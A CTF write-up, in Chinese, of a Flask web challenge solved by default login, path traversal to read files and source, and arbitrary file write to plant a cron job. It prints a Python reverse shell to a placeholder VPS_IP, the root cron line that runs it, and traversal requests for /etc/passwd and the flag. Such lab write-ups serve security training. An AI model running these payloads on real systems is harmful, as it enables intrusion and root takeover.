# 文件防篡改系统 — CTF Writeup

## 题目信息

- **题目名称**：文件防篡改系统（综合题）
- **题目类型**：Web — 路径遍历 + 任意文件写入 + Cron RCE
- **技术栈**：Flask (Werkzeug/2.2.3 Python/3.7.17)
- **难度**：中等

## 解题流程

### 一、信息收集

访问目标地址，返回一个登录页面，标题为"好靶场 | 文件防篡改系统 - 登录"。

页面中有一个**"查看文件防篡改系统使用手册"**按钮，点击后弹窗中包含关键信息：

> **初始密码**：请使用 `haobachangadmin`/`haobachangadmin123` 登录。

响应头确认技术栈：

```
Server: Werkzeug/2.2.3 Python/3.7.17
```

### 二、登录与功能枚举

使用默认凭据登录成功，发现系统有三个功能页面：

| 路由 | 功能 |
|------|------|
| `/dashboard` | 控制台首页，展示系统信息 |
| `/file-publish` | 文件发布（写入文件） |
| `/file-center` | 文件中心（浏览/查看/下载/删除文件） |

其中文件中心页面展示了文件操作链接：

```
/download-file?path=file/test.txt       — 下载
/view-file-content?path=file/test.txt   — 查看
/delete-file-system?path=file/test.txt  — 删除
```

### 三、路径遍历读取任意文件

`/view-file-content` 和 `/download-file` 路由对 `path` 参数仅检查 `file_path.startswith('file')`，未校验 `../`，导致路径遍历：

```bash
# 读取 /etc/passwd
curl -b cookies "http://TARGET:8888/view-file-content?path=file/../../../etc/passwd"
```

成功读取到 `/etc/passwd` 内容，确认漏洞存在。

还可以通过文件中心直接遍历目录：

```
/file-center?path=file/../../../    → 列出根目录
/file-center?path=file/../../../app → 列出应用目录
```

### 四、读取源码

通过路径遍历读取 Flask 应用源码：

```bash
curl -b cookies "http://TARGET:8888/view-file-content?path=file/../../../app/app.py"
```

**关键漏洞代码**（`/file-publish` 路由）：

```python
# 路径穿越漏洞：没有对filepath进行安全验证
full_path = os.path.join('file', filename)

# 创建目录（如果不存在）
os.makedirs(os.path.dirname(full_path), exist_ok=True)

# 使用echo命令进行写入
import subprocess, shlex
cmd = f"echo {shlex.quote(content)} > {shlex.quote(full_path)}"
subprocess.run(cmd, shell=True, check=True)
```

分析：
- `filename` 参数直接拼接到路径中，**未过滤 `../`**
- `content` 和 `full_path` 虽然经过 `shlex.quote()` 转义，无法直接命令注入
- 但 `filename` 的路径穿越 + `subprocess.run(shell=True)` 组合可以实现**写入任意文件**

同时发现 `entrypoint.sh` 中容器启动了 cron 服务：

```bash
#!/bin/bash
set -e
service cron start
exec python app.py
```

### 五、利用 Cron 实现命令执行

#### 步骤 1：写入反向 Shell 脚本

```bash
curl -b cookies \
  --data-urlencode "filename=../../../tmp/rev.sh" \
  --data-urlencode "content=#!/bin/bash
/usr/local/bin/python3 -c 'import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((\"VPS_IP\",29999))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call([\"/bin/bash\",\"-i\"])
'" \
  http://TARGET:8888/file-publish
```

> **注意**：使用 `--data-urlencode` 确保 `+` 等 Python 字符串拼接符不会被表单编码误解为空格。

#### 步骤 2：写入 Cron 任务

```bash
curl -b cookies \
  --data-urlencode "filename=../../../etc/cron.d/rev" \
  --data-urlencode "content=* * * * * root /bin/bash /tmp/rev.sh" \
  http://TARGET:8888/file-publish
```

#### 步骤 3：VPS 监听接收反向 Shell

在 VPS 上设置端口映射（外部 29999 → 内部 9999），启动监听：

```bash
# VPS 上启动 Python handler
python3 handler.py  # 监听 0.0.0.0:9999
```

等待约 1 分钟，cron 执行后即可获得 root 权限的交互式 shell。

### 六、查找 Flag

通过反向 Shell 在容器中搜索 flag：

```bash
# 环境变量中 FLAG 和 GZCTF_FLAG 均为空
cat /proc/1/environ | tr '\0' '\n' | grep -iE "flag|GZCTF"
# FLAG=
# GZCTF_FLAG=

# 常见位置无 flag 文件
ls -la /flag* /readflag 2>/dev/null
# 无输出

# 全局搜索发现 /tmp/flag.txt
find / -maxdepth 4 -name "flag*" -type f 2>/dev/null | grep -v /proc | grep -v /sys
# /tmp/flag.txt
```

也可以直接通过路径遍历读取：

```bash
curl -b cookies "http://TARGET:8888/view-file-content?path=file/../../../tmp/flag.txt"
```

返回：

```
flag{c832b3a3ee8a4182b175d25900fd4cc4}
```

## 漏洞总结

| 漏洞 | 位置 | 利用方式 |
|------|------|----------|
| 默认凭据 | 登录页使用手册 | `haobachangadmin`/`haobachangadmin123` |
| 路径遍历（读） | `/view-file-content?path=` | `file/../../../etc/passwd` |
| 路径遍历（写） | `/file-publish` 的 `filename` | `../../../etc/cron.d/xxx` |
| 任意命令执行 | cron + 任意文件写入 | 写入计划任务文件实现 RCE |

## 攻击链路

```
默认凭据登录 → 路径遍历读源码 → 路径遍历写 cron 任务 → Cron RCE → 反向 Shell → 读取 Flag
```

## 关键技巧

1. **Flag 隐藏位置**：本题 flag 位于 `/tmp/flag.txt`，而非常见的 `/flag` 或环境变量，需要全面搜索
2. **表单编码问题**：文件内容中的 Python `+` 运算符在 `application/x-www-form-urlencoded` 编码中会被解释为空格，需使用 `--data-urlencode` 确保正确传输
3. **Cron 服务**：容器 `entrypoint.sh` 中 `service cron start` 是实现 RCE 的关键前提
4. **VPS 端口映射**：反向 Shell 需要 VPS 配置 NAT 端口映射（外部端口 → 内部监听端口）才能接收来自容器的连接
